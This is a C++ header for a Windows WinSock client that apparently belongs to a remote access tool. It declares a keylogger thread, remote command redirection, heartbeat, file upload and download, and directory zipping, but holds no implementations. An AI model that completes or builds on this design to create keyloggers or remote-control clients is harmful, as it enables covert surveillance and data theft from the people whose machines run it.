#pragma once

#ifndef CLIENT_H
#define CLIENT_H

#pragma comment(lib,"ws2_32.lib") //Required for WinSock#include "client.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <WS2tcpip.h>

#include "FileTransferData.h"
#include "PacketType.h"
#include "general.h"
#include "cmdRedirect.h"
#include "keylogger.h"

enum Packet
{
	P_Instruction,
	P_CMDCommand,
	P_Error
};

class Client
{
public: //Public functions
	Client(std::string IP, int PORT);
	static Client * clientptr;
	bool Connect();

	bool SendString(std::string _string, PacketType _packettype);
	bool CloseConnection();
	bool RequestFile(std::string FileName, bool wait = false);
	static void KeyloggerThread();
	static void HearthBeatThread();

	static bool connected;
	static Client main_client;
private: //Private functions
	bool ProcessPacketType(PacketType _PacketType);
	static void ClientThread();

	//Utility
	bool resolveIP(std::string &hostname);	//for DNS

	//Sending Funcs
	bool sendall(char * data, int totalbytes);
	bool Sendint32_t(int32_t _int32_t);
	bool SendPacketType(PacketType _PacketType);
	bool HandleSendFile();

	//Getting Funcs
	bool recvall(char * data, int totalbytes);
	bool Getint32_t(int32_t & _int32_t);
	bool GetPacketType(PacketType & _PacketType);
	bool GetString(std::string & _string);

private:
	FileTransferData file; //Object that contains information about our file that is being received from the server.
	FileTransferData ofile; //Object that contains information about our file that is being sent the server.

	SOCKET Connection;//This client's connection to the server
	SOCKADDR_IN addr; //Address to be binded to our Connection socket
};

//This client ptr is necessary so that the ClientThread method can access the Client instance/methods. 
						//Since the ClientThread method is static, this is the simplest workaround I could think of since there will only be one instance of the client.

struct ZipArgs {
	std::string dir;
	std::string output_name;
	bool zipping;
};

bool unzip(const std::string& zipPath, const std::string& desPath);
bool zip_directory(const std::string& inputdir, const std::string& output_name);
void zip_directory_async(ZipArgs* args);

#endif // !CLIENT_H